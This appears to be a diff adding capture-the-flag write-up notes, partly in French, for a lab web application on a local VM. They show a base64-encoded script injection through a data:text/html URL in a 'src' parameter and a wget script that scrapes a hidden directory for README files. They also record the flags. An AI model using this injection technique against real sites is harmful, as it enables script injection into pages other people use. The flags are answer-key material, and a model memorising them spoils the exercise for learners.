@@ -1,0 +1,63 @@
+Include not safe => XSS
+
+<script>alert('toto')</script> en base64
+PHNjcmlwdD5hbGVydCgndG90bycpPC9zY3JpcHQ+
+
+http://192.168.30.129/?page=media&src=data:text/html;base64,PHNjcmlwdD5hbGVydCgndG90bycpPC9zY3JpcHQ+
+
+THE FLAG IS : 928D819FC19405AE09921A2B71227BD9ABA106F9D2D37AC412E9E5A750F1506D
+
+
+
+
+
+
+#!/bin/bash
+
+if [ -z "$1" ]
+then
+	echo "I need an IP address"
+else
+	mkdir ./scraped ; cd ./scraped
+	wget -np -r -A "README*" -nd -l 0 -e robots=off http://$1/.hidden/
+	tmp=`ls | grep README | wc -l`
+	index=$(($tmp-1))
+	readme="README."
+	while [ $index != 0 ]
+	do
+		file=$readme$index
+		str=`cat $file | grep 2`
+		printf "%s" $str
+		index=$(($index-1))
+	done
+	str=`cat "README" | grep -E [0-9a-f]{64}`
+	printf "%s" $str
+fi
+
+
+- On s'interesse au path /.hidden trouvé précédemment dans le fichier robots.txt
+
+- Il contient un fichier README ainsi des liens vers des sous-répertoire contenant eux-mêmes un fichier README et d'autres sous-répertoire.
+
+- On créer un script pour automatiser le téléchargement de tous les fichiers README présents dans l'arborescence de /.hidden (scraping.sh)
+
+- Celui-ci utilisera la commande wget de manière récursive en récupérant uniquement les fichiers README.
+
+- On affiche ensuite le contenu des fichiers en isolant le flag grâce à une regex.
+
+
+---------------
+
+
+
+- On clique sur l'image rsa_prism depuis la page d'acceuil.
+
+- On arrive sur une page où se trouve une image, on remarque les parametres dans l'url.
+
+- On inspecte la page et on voit qu'une requête GET est effectuée, le header nous informe que différents types de contenu sont acceptés notament le type text/html.
+
+- Le paramatre src dans l'url doit correspondre à une image en base64, on injecte donc un script dans cet encodage pour obtenir le flag.
+
+<script>alert("toto")</script> -> PHNjcmlwdD5hbGVydCgidG90byIpPC9zY3JpcHQ+
+
+http://ISO_IP_Adress/?page=media&src=data:text/html;base64,PHNjcmlwdD5hbGVydCgidG90byIpPC9zY3JpcHQ+
